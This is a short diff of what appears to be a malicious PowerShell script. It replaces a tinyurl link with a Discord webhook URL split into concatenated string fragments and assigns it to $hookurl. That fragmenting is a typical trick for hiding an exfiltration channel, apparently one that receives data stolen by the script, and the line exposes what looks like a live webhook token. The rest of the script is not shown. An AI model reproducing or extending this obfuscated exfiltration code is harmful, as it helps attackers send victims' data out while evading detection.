@@ -18,7 +18,7 @@ sleep 1
 Add-Type -AssemblyName System.Windows.Forms
 
 
-$dc = "https://tinyurl.com/opoium1"
+$dc = "https:/"+"/dis"+"co"+"rd.com/api/we"+"bhooks/13557"+"84363614277723/ib9g"+"-hbzYkp960d4ZJQUDFjyDo5E9EB6ekrXQswc9dDaN1iunR6LlpevdkCub9TfsTQO"
 
 
 $hookurl = "$dc"
